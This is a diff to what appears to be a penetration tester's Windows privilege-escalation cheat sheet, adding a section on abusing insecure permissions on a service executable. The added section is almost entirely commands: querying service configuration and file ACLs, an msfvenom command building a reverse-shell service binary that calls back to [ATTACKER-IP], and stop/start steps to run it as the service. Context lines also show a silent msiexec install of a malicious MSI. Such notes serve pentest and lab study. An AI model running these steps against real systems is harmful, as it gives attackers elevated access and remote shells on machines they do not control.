@@ -7,6 +7,7 @@
 * [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
 * [Scheduled Tasks](#scheduled-tasks)
 * [AlwaysInstallElevated](#alwaysinstallelevated)
+* [Insecure Permissions on Service Executable](#insecure-permissions-on-service-executable)
 
 *********************************************************************************
 Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
@@ -118,6 +119,34 @@ As this is a reverse shell, you should also run the Metasploit Handler module co
 ```
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
+
+********************************************
+
+## Insecure Permissions on Service Executable
+
+Query service configuration with:
+```
+sc qc [SERVICE-NAME]
+```
+Note the BINARY_PATH_NAME and check the file permissions with:
+```
+icacls [BINARY-PATH-NAME]
+```
+* Look for (F)ull or (M)odify rights in various groups
+* Create payload with:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o rev-svc.exe
+```
+* Transfer the file to target machine and start a listener on attack machine
+* Restart the insecure service:
+```
+sc stop [SERVICE-NAME]
+```
+```
+sc start [SERVICE-NAME]
+```
+* There should be a shell on the attack machine
+* Note: PowerShell has "sc" as an alias to "Set-Content", therefore you need to use "sc.exe" in order to control services with PowerShell this way.
 
 ********************************************
 
